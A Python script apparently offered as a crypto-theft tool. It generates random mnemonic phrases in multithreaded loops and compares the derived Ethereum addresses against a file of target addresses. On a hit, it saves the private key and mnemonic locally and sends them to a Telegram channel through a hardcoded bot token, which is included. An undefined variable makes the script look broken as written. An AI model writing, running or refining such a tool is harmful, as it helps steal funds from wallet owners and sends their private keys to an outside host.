
from eth_wallet import Wallet
from eth_wallet.utils import generate_entropy
from web3 import Web3, HTTPProvider
import threading
import requests

print("BY @XopMC for t.me/brythbit")
lang = int(input("Choose language for mnemonics words: 1 - English; 2 - Chinese Simplified; 3 - Chinese Traditional; 4 - French; 5 - Italian; 6 - Spanish; 7 - Japanese; 8 - Korean (input 1 or 2 or 3 or 4 or 5 or 6 or 7 or 8):  "))
if lang == 1:
    LANGUAGE ="english"
    pass
elif lang == 2:
    LANGUAGE ="chinese_simplified"
    pass
elif lang == 3:
    LANGUAGE ="chinese_traditional"
    pass
elif lang == 4:
    LANGUAGE ="french"
    pass
elif lang == 5:
    LANGUAGE ="italian"
    pass
elif lang == 6:
    LANGUAGE ="spanish"
    pass
elif lang == 7:
    LANGUAGE ="japanese"
    pass
elif lang == 8:
    LANGUAGE ="korean"
    pass
else:
    print("ERROR!!! Please input correct number")
    quit()

threadCount = input(' How many threads to run?:  ')
count = 0
found = 0
class telegram:
    token = '5237275928:AAE_v3LMCBoNJSO-zeQPYBrqjOWxPGpaMvk'
    channel_id = '@maxgood11'
def send_telegram(text: str):
    try:
        requests.get('https://api.telegram.org/bot{}/sendMessage'.format(telegram.token), params=dict(
        chat_id=telegram.channel_id,
        text=text))
        print ("Send to telegram")
    except:
        print(f'Error send telegram.')
send_telegram(f"Start Work {worker}, Language {LANGUAGE}")
filename ='ETH.txt'
print("Loading base")
with open(filename) as f:
    line_count = 0
    for line in f:
        line != "\n"
        line_count += 1

with open(filename) as file:
    add = file.read().split()
add = set(add)

print('Total Addresses Loaded and Checking : ',str (line_count))

def seek():
    
    #def balance():
    #    w3 = Web3(Web3.HTTPProvider('http://173.212.227.224:8545'))
    #    get_balance = w3.eth.get_balance(address)
    #    return get_balance

    #def transaction():
    #    w3 = Web3(Web3.HTTPProvider('http://173.212.227.224:8545'))
    #    get_transaction = w3.eth.get_transaction_count(address)
    #    return get_transaction



    while True:
        PASSPHRASE = None
        #LANGUAGE ="english" # chinese_simplified, chinese_traditional, english
        global LANGUAGE
        ENTROPY = generate_entropy(strength=256)
        wallet = Wallet()
        wallet.from_entropy(entropy=ENTROPY, passphrase=PASSPHRASE, language=LANGUAGE)
        wallet.from_index(44,harden=True)
        wallet.from_index(60, harden=True)
        wallet.from_index(0, harden=True)
        wallet.from_index(0)
        wallet.from_index(0, harden=True)
        address = wallet.address()
        priv = wallet.private_key()
        mnemonic = wallet.mnemonic()
        priv_imp = wallet.wallet_import_format()
        global count, found, add
        count+=1*int(threadCount)
        #print("Address: ", address, "\n", "Mnemonic: " , mnemonic, "\n", "PrivateKey: ", priv, "\n", "count: ", count, "  found: ", found)
        print("count: ", count, "  found: ", found, end="\r")

        if address in add:
            print("Address: ", address, "\n", "Mnemonic: " , mnemonic, "\n", "PrivateKey: ", priv, "\n", "count: ", count, "  found: ", found)
            found+=1
            file = open("found.txt", "a")
            file.write("Address: " + address + "\n" +
                    "PrivKey: " + priv + "\n" +
                    "PrivImp: " + priv_imp + "\n" +
                    "Mnemonic: " + mnemonic + "\n" +
                    "==================================================" + "\n" + "\n")
            file.close()
            send_telegram("Worker" + worker + "\n" + "Address: " + address + "\n" +
                    "PrivKey: " + priv + "\n" +
                    "PrivImp: " + priv_imp + "\n" +
                    "Mnemonic: " + mnemonic + "\n" +
                    "==================================================" + "\n" + "\n")

threads = []


for i in range(int(threadCount)):
    t = threading.Thread(target=seek)
    threads.append(t)
    t.start()